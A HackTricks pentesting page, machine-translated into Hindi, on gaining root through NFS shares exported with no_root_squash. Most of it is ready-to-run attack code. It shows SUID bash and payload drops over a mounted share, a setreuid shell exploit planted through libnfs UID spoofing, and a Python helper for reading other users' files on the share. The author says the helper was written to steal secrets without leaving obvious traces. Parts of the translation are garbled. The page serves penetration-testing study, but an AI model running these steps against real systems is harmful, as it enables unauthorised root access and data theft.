<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करने की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>


_ **/etc/exports** _ फ़ाइल को पढ़ें, यदि आपको कुछ ऐसा डायरेक्टरी मिलता है जो **no\_root\_squash** के रूप में कॉन्फ़िगर किया गया है, तो आप उसे एक **क्लाइंट के रूप में एक्सेस** कर सकते हैं और उस डायरेक्टरी में **लोकल रूट** के रूप में **लिख सकते** हैं।

**no\_root\_squash**: यह विकल्प मूल रूप से क्लाइंट पर रूट उपयोगकर्ता को रूट के रूप में NFS सर्वर पर फ़ाइलों तक पहुंच देता है। और इससे गंभीर सुरक्षा संबंधित परेशानियां हो सकती हैं।

**no\_all\_squash:** यह **no\_root\_squash** विकल्प के समान है, लेकिन इसका उपयोग **गैर-रूट उपयोगकर्ताओं** के लिए होता है। कल्पित करें, आपके पास nobody उपयोगकर्ता के रूप में शेल है; /etc/exports फ़ाइल की जांच की; no\_all\_squash विकल्प मौजूद है; /etc/passwd फ़ाइल की जांच की; गैर-रूट उपयोगकर्ता के रूप में एक नकली उपयोगकर्ता को अनुकरण किया; उस उपयोगकर्ता के रूप में एक suid फ़ाइल बनाएं (nfs का उपयोग करके माउंट करके)। suid को nobody उपयोगकर्ता के रूप में निष्पादित करें और अलग-अलग उपयोगकर्ता बनें।

# विशेषाधिकार उन्नयन

## दूरस्थ शोषण

यदि आपने इस कमजोरी को खोजा है, तो आप इसे शोषण कर सकते हैं:

* एक क्लाइंट मशीन में उस डायरेक्टरी को **माउंट करके**, और उस माउंट किए गए फ़ोल्डर में **/bin/bash** बाइनरी की **कॉपी** करके उसे **SUID** अधिकार दें, और **पीड़ित** मशीन से उस बैश बाइनरी को निष्पादित करें।
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **उस निर्देशिका को माउंट करें** क्लाइंट मशीन में, और **रूट के रूप में कॉपी करें** माउंट किए गए फ़ोल्डर में हमारे कंपाइल्ड पेलोड को जो SUID अनुमति का दुरुपयोग करेगा, उसे **SUID** अधिकार दें, और विक्टिम मशीन से उस बाइनरी को निष्पादित करें (यहां आपको कुछ [सी SUID पेलोड](payloads-to-execute.md#c) मिलेंगे)।
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## स्थानीय उत्पीड़न

{% hint style="info" %}
ध्यान दें कि यदि आप अपनी मशीन से पीड़ित मशीन तक एक **टनल बना सकते हैं तो आप फिर भी इस विशेषाधिकार उत्पीड़न को उत्पन्न करने के लिए दूरस्थ संस्करण का उपयोग कर सकते हैं आवश्यक पोर्टों को टनल करते हुए**।\
यदि `/etc/exports` फ़ाइल में एक IP निर्दिष्ट करती है तो निम्नलिखित चाल काम नहीं करेगी और आपको इस चाल का दुरुपयोग करने की आवश्यकता होगी।\
उत्पीड़न को काम करने के लिए एक और आवश्यक आवश्यकता यह है कि `/etc/export` के भीतर निर्यात **`असुरक्षित` ध्वज का उपयोग करना चाहिए**।\
\--_मुझे यकीन नहीं है कि यदि `/etc/export` एक IP पता निर्दिष्ट कर रहा है तो यह चाल काम करेगी_--
{% endhint %}

**ट्रिक** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html) **से कॉपी की गई है**

अब, यह मान लेते हैं कि शेयर सर्वर अभी भी `no_root_squash` चला रहा है लेकिन हमें शेयर को हमारी पेंटेस्ट मशीन पर माउंट करने से रोकने वाली कुछ बात है। यह इसलिए होगा क्योंकि `/etc/exports` में शेयर को माउंट करने की अनुमति देने वाले IP पतों की एक स्पष्ट सूची है।

शेयर की सूची अब दिखाती है कि केवल वह मशीन इसे माउंट करने की अनुमति देने के लिए जिस पर हम प्राइवेसी करने की कोशिश कर रहे हैं:
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
इसका मतलब है कि हम अनुप्रयोगी उपयोगकर्ता के रूप में स्थानीय रूप से मशीन पर माउंट किए गए साझा को उत्पन्न करने के लिए अवसरहीन हैं। लेकिन यह बात तो होती है कि एक और, कम ज्ञात स्थानीय उत्पीड़न है।

इस उत्पीड़न का आधार एक समस्या पर है जो NFSv3 निर्देशिका में होती है जो यह निर्धारित करती है कि जब शेयर तक पहुंचते समय उपयोगकर्ता के uid/gid का विज्ञापन करना उपयोगकर्ता के ऊपर है। इसलिए, यदि शेयर पहले से ही माउंट किया गया है, तो NFS RPC कॉल्स को जाली uid/gid बनाने के द्वारा uid/gid को नकली करना संभव है!

यहां एक [पुस्तकालय है जो आपको इसे करने देती है](https://github.com/sahlberg/libnfs)।

### उदाहरण को कंपाइल करना <a href="#compiling-the-example" id="compiling-the-example"></a>

अपने कर्नल के आधार पर, आपको उदाहरण को अनुकूलित करने की आवश्यकता हो सकती है। मेरे मामले में, मुझे fallocate syscalls को टिप्पणी करनी पड़ी।
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### पुस्तकालय का उपयोग करके शोध करना <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

चलो सबसे सरल शोध का उपयोग करें:
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
अपने एक्सप्लॉइट को साझा में रखें और RPC कॉल में अपने uid को फेक करके इसे suid root बनाएं:
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
अब इसे लॉन्च करना बाकी है:
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
यहां हम हैं, स्थानीय रूट प्रिविलेज एस्केलेशन!

## बोनस NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

मशीन पर स्थानीय रूट होने के बाद, मुझे NFS साझा से संभवतः गुप्त जानकारी चोरी करनी थी जो मुझे पिवट करने में मदद कर सकती है। लेकिन यहां कई उपयोगकर्ता थे जिनके अलग-अलग uid होते थे जिन्हें मैं रूट होने के बावजूद पढ़ नहीं सकता था क्योंकि uid मिलान नहीं हो रहा था। मैं चौंकाने वाले संकेत नहीं छोड़ना चाहता था जैसे कि chown -R, इसलिए मैंने अपने uid को सेट करने के लिए एक छोटा स्निपेट बनाया था जिससे मैं चाहे गए शैल कमांड को चला सकूं:
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
आप फिर से सामान्य रूप से अपने द्वारा चलाए जाने वाले अधिकांश कमांडों को स्क्रिप्ट के साथ प्राथमिकता देकर चला सकते हैं:
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PR जमा करके।

</details>
